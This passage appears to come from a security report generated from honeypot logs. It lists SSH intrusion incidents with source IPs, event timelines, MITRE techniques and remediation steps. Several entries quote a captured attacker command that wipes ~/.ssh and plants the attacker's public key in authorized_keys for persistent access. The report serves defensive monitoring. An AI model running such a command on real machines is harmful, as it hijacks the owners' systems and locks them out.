| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 10:58:56` | `cowrie.session.connect` |
| `2026-04-06 10:58:56` | `cowrie.client.version` |
| `2026-04-06 10:58:56` | `cowrie.client.kex` |
| `2026-04-06 10:58:57` | `cowrie.login.success` |
| `2026-04-06 10:58:58` | `cowrie.session.params` |
| `2026-04-06 10:58:58` | `cowrie.command.input` |
| `2026-04-06 10:58:58` | `cowrie.command.failed` |
| `2026-04-06 10:58:58` | `cowrie.log.closed` |
| `2026-04-06 10:58:58` | `cowrie.session.params` |
| `2026-04-06 10:58:58` | `cowrie.command.input` |
| `2026-04-06 10:58:58` | `cowrie.session.file_download` |
| `2026-04-06 10:58:58` | `cowrie.log.closed` |
| `2026-04-06 10:59:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.157[.]64` to AbuseIPDB if not already reported
- [ ] Block `172.191.157[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7948413f3905

| Field | Detail |
|---|---|
| **Source IP** | `172.191.157[.]64` |
| **First Seen** | 2026-04-06 10:59 |
| **Last Seen** | 2026-04-06 10:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 10:59:01` | `cowrie.session.connect` |
| `2026-04-06 10:59:01` | `cowrie.client.version` |
| `2026-04-06 10:59:01` | `cowrie.client.kex` |
| `2026-04-06 10:59:02` | `cowrie.login.success` |
| `2026-04-06 10:59:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.157[.]64` to AbuseIPDB if not already reported
- [ ] Block `172.191.157[.]64` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c4e67613ed0

| Field | Detail |
|---|---|
| **Source IP** | `14.248.82[.]58` |
| **First Seen** | 2026-04-06 11:00 |
| **Last Seen** | 2026-04-06 11:00 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 11:00:19` | `cowrie.session.connect` |
| `2026-04-06 11:00:19` | `cowrie.client.version` |
| `2026-04-06 11:00:19` | `cowrie.client.kex` |
| `2026-04-06 11:00:19` | `cowrie.login.success` |
| `2026-04-06 11:00:20` | `cowrie.session.params` |
| `2026-04-06 11:00:20` | `cowrie.command.input` |
| `2026-04-06 11:00:20` | `cowrie.command.failed` |
| `2026-04-06 11:00:20` | `cowrie.log.closed` |
| `2026-04-06 11:00:20` | `cowrie.session.params` |
| `2026-04-06 11:00:20` | `cowrie.command.input` |
| `2026-04-06 11:00:20` | `cowrie.session.file_download` |
| `2026-04-06 11:00:20` | `cowrie.log.closed` |
| `2026-04-06 11:00:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.82[.]58` to AbuseIPDB if not already reported
- [ ] Block `14.248.82[.]58` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e97a46a13267

| Field | Detail |
|---|---|
| **Source IP** | `14.248.82[.]58` |
| **First Seen** | 2026-04-06 11:00 |
| **Last Seen** | 2026-04-06 11:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 11:00:22` | `cowrie.session.connect` |
| `2026-04-06 11:00:22` | `cowrie.client.version` |
| `2026-04-06 11:00:22` | `cowrie.client.kex` |
| `2026-04-06 11:00:22` | `cowrie.login.success` |
| `2026-04-06 11:00:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.82[.]58` to AbuseIPDB if not already reported
- [ ] Block `14.248.82[.]58` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-339d4ecb93d4

| Field | Detail |
|---|---|
| **Source IP** | `103.56.30[.]33` |
| **First Seen** | 2026-04-06 11:01 |
| **Last Seen** | 2026-04-06 11:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 11:01:42` | `cowrie.session.connect` |
| `2026-04-06 11:01:42` | `cowrie.client.version` |
| `2026-04-06 11:01:42` | `cowrie.client.kex` |
| `2026-04-06 11:01:42` | `cowrie.login.success` |
| `2026-04-06 11:01:42` | `cowrie.session.params` |
| `2026-04-06 11:01:42` | `cowrie.command.input` |
| `2026-04-06 11:01:42` | `cowrie.command.failed` |
| `2026-04-06 11:01:43` | `cowrie.log.closed` |
| `2026-04-06 11:01:43` | `cowrie.session.params` |
| `2026-04-06 11:01:43` | `cowrie.command.input` |
| `2026-04-06 11:01:43` | `cowrie.session.file_download` |
| `2026-04-06 11:01:43` | `cowrie.log.closed` |
| `2026-04-06 11:01:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.56.30[.]33` to AbuseIPDB if not already reported
- [ ] Block `103.56.30[.]33` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ed69498ba70

| Field | Detail |
|---|---|
| **Source IP** | `103.56.30[.]33` |
| **First Seen** | 2026-04-06 11:01 |
| **Last Seen** | 2026-04-06 11:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 11:01:44` | `cowrie.session.connect` |
| `2026-04-06 11:01:44` | `cowrie.client.version` |
| `2026-04-06 11:01:44` | `cowrie.client.kex` |
| `2026-04-06 11:01:44` | `cowrie.login.success` |
| `2026-04-06 11:01:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.56.30[.]33` to AbuseIPDB if not already reported
- [ ] Block `103.56.30[.]33` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-190f678622fe

| Field | Detail |
|---|---|
| **Source IP** | `14.248.82[.]58` |
| **First Seen** | 2026-04-06 11:03 |
| **Last Seen** | 2026-04-06 11:03 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 11:03:53` | `cowrie.session.connect` |
| `2026-04-06 11:03:53` | `cowrie.client.version` |
| `2026-04-06 11:03:53` | `cowrie.client.kex` |
| `2026-04-06 11:03:53` | `cowrie.login.success` |
| `2026-04-06 11:03:54` | `cowrie.session.params` |
| `2026-04-06 11:03:54` | `cowrie.command.input` |
| `2026-04-06 11:03:54` | `cowrie.command.failed` |
| `2026-04-06 11:03:54` | `cowrie.log.closed` |
| `2026-04-06 11:03:54` | `cowrie.session.params` |
| `2026-04-06 11:03:54` | `cowrie.command.input` |
| `2026-04-06 11:03:54` | `cowrie.session.file_download` |
| `2026-04-06 11:03:54` | `cowrie.log.closed` |
| `2026-04-06 11:03:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.82[.]58` to AbuseIPDB if not already reported
- [ ] Block `14.248.82[.]58` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de48f2f6a7b6

| Field | Detail |
|---|---|
| **Source IP** | `154.18.197[.]35` |
| **First Seen** | 2026-04-06 11:03 |
| **Last Seen** | 2026-04-06 11:03 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 11:03:55` | `cowrie.session.connect` |
| `2026-04-06 11:03:55` | `cowrie.client.version` |
| `2026-04-06 11:03:55` | `cowrie.client.kex` |
| `2026-04-06 11:03:56` | `cowrie.login.success` |
| `2026-04-06 11:03:56` | `cowrie.session.params` |
| `2026-04-06 11:03:56` | `cowrie.command.input` |
| `2026-04-06 11:03:56` | `cowrie.command.failed` |
| `2026-04-06 11:03:56` | `cowrie.log.closed` |
| `2026-04-06 11:03:57` | `cowrie.session.params` |
| `2026-04-06 11:03:57` | `cowrie.command.input` |
| `2026-04-06 11:03:57` | `cowrie.session.file_download` |
| `2026-04-06 11:03:57` | `cowrie.log.closed` |
| `2026-04-06 11:03:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.18.197[.]35` to AbuseIPDB if not already reported
- [ ] Block `154.18.197[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-086f6b4ccf06

| Field | Detail |
|---|---|
| **Source IP** | `14.248.82[.]58` |
| **First Seen** | 2026-04-06 11:03 |
| **Last Seen** | 2026-04-06 11:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 11:03:56` | `cowrie.session.connect` |
| `2026-04-06 11:03:56` | `cowrie.client.version` |
| `2026-04-06 11:03:56` | `cowrie.client.kex` |
| `2026-04-06 11:03:57` | `cowrie.login.success` |
| `2026-04-06 11:03:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.82[.]58` to AbuseIPDB if not already reported
- [ ] Block `14.248.82[.]58` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d942dc1e17bb

| Field | Detail |
|---|---|
| **Source IP** | `154.18.197[.]35` |
| **First Seen** | 2026-04-06 11:03 |
| **Last Seen** | 2026-04-06 11:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 11:03:59` | `cowrie.session.connect` |
| `2026-04-06 11:03:59` | `cowrie.client.version` |
| `2026-04-06 11:03:59` | `cowrie.client.kex` |
| `2026-04-06 11:03:59` | `cowrie.login.success` |
| `2026-04-06 11:03:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.18.197[.]35` to AbuseIPDB if not already reported
- [ ] Block `154.18.197[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a61d34273489

| Field | Detail |
|---|---|
| **Source IP** | `14.248.82[.]58` |
| **First Seen** | 2026-04-06 11:05 |
| **Last Seen** | 2026-04-06 11:05 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 11:05:38` | `cowrie.session.connect` |
| `2026-04-06 11:05:38` | `cowrie.client.version` |
| `2026-04-06 11:05:38` | `cowrie.client.kex` |
| `2026-04-06 11:05:38` | `cowrie.login.success` |
| `2026-04-06 11:05:39` | `cowrie.session.params` |
| `2026-04-06 11:05:39` | `cowrie.command.input` |
| `2026-04-06 11:05:39` | `cowrie.command.failed` |
| `2026-04-06 11:05:39` | `cowrie.log.closed` |
| `2026-04-06 11:05:39` | `cowrie.session.params` |
| `2026-04-06 11:05:39` | `cowrie.command.input` |
| `2026-04-06 11:05:39` | `cowrie.session.file_download` |
| `2026-04-06 11:05:39` | `cowrie.log.closed` |
| `2026-04-06 11:05:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.82[.]58` to AbuseIPDB if not already reported
- [ ] Block `14.248.82[.]58` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ae177b43517

| Field | Detail |
|---|---|
| **Source IP** | `14.248.82[.]58` |
| **First Seen** | 2026-04-06 11:05 |
| **Last Seen** | 2026-04-06 11:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 11:05:41` | `cowrie.session.connect` |
| `2026-04-06 11:05:41` | `cowrie.client.version` |
| `2026-04-06 11:05:41` | `cowrie.client.kex` |
| `2026-04-06 11:05:42` | `cowrie.login.success` |
| `2026-04-06 11:05:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.82[.]58` to AbuseIPDB if not already reported
- [ ] Block `14.248.82[.]58` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee4ae3fb46bb

| Field | Detail |
|---|---|
| **Source IP** | `14.248.82[.]58` |
| **First Seen** | 2026-04-06 11:07 |
| **Last Seen** | 2026-04-06 11:07 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 11:07:28` | `cowrie.session.connect` |
| `2026-04-06 11:07:28` | `cowrie.client.version` |
| `2026-04-06 11:07:28` | `cowrie.client.kex` |
| `2026-04-06 11:07:28` | `cowrie.login.success` |
| `2026-04-06 11:07:29` | `cowrie.session.params` |
| `2026-04-06 11:07:29` | `cowrie.command.input` |
| `2026-04-06 11:07:29` | `cowrie.command.failed` |
| `2026-04-06 11:07:29` | `cowrie.log.closed` |
| `2026-04-06 11:07:29` | `cowrie.session.params` |
| `2026-04-06 11:07:29` | `cowrie.command.input` |
| `2026-04-06 11:07:29` | `cowrie.session.file_download` |
| `2026-04-06 11:07:29` | `cowrie.log.closed` |
| `2026-04-06 11:07:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.82[.]58` to AbuseIPDB if not already reported
- [ ] Block `14.248.82[.]58` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-795fffce8e57

| Field | Detail |
|---|---|
| **Source IP** | `14.248.82[.]58` |
| **First Seen** | 2026-04-06 11:07 |
| **Last Seen** | 2026-04-06 11:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 11:07:31` | `cowrie.session.connect` |
| `2026-04-06 11:07:31` | `cowrie.client.version` |
| `2026-04-06 11:07:31` | `cowrie.client.kex` |
| `2026-04-06 11:07:32` | `cowrie.login.success` |
| `2026-04-06 11:07:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.82[.]58` to AbuseIPDB if not already reported
- [ ] Block `14.248.82[.]58` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae226831cad5

| Field | Detail |
|---|---|
| **Source IP** | `103.56.30[.]33` |
| **First Seen** | 2026-04-06 11:08 |
| **Last Seen** | 2026-04-06 11:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 11:08:53` | `cowrie.session.connect` |
| `2026-04-06 11:08:53` | `cowrie.client.version` |
| `2026-04-06 11:08:53` | `cowrie.client.kex` |
| `2026-04-06 11:08:54` | `cowrie.login.success` |
| `2026-04-06 11:08:54` | `cowrie.session.params` |
| `2026-04-06 11:08:54` | `cowrie.command.input` |
| `2026-04-06 11:08:54` | `cowrie.command.failed` |
| `2026-04-06 11:08:54` | `cowrie.log.closed` |
| `2026-04-06 11:08:54` | `cowrie.session.params` |
| `2026-04-06 11:08:54` | `cowrie.command.input` |
| `2026-04-06 11:08:54` | `cowrie.session.file_download` |
| `2026-04-06 11:08:54` | `cowrie.log.closed` |
| `2026-04-06 11:08:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.56.30[.]33` to AbuseIPDB if not already reported
- [ ] Block `103.56.30[.]33` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c98b72790e16

| Field | Detail |
|---|---|
| **Source IP** | `103.56.30[.]33` |
| **First Seen** | 2026-04-06 11:08 |
| **Last Seen** | 2026-04-06 11:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 11:08:55` | `cowrie.session.connect` |
| `2026-04-06 11:08:55` | `cowrie.client.version` |
| `2026-04-06 11:08:55` | `cowrie.client.kex` |
| `2026-04-06 11:08:55` | `cowrie.login.success` |
| `2026-04-06 11:08:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.56.30[.]33` to AbuseIPDB if not already reported
- [ ] Block `103.56.30[.]33` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-266855bb0b7e

| Field | Detail |
|---|---|
| **Source IP** | `14.248.82[.]58` |
| **First Seen** | 2026-04-06 11:09 |
| **Last Seen** | 2026-04-06 11:09 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 11:09:17` | `cowrie.session.connect` |
| `2026-04-06 11:09:17` | `cowrie.client.version` |
| `2026-04-06 11:09:17` | `cowrie.client.kex` |
| `2026-04-06 11:09:17` | `cowrie.login.success` |
| `2026-04-06 11:09:17` | `cowrie.session.params` |
| `2026-04-06 11:09:17` | `cowrie.command.input` |
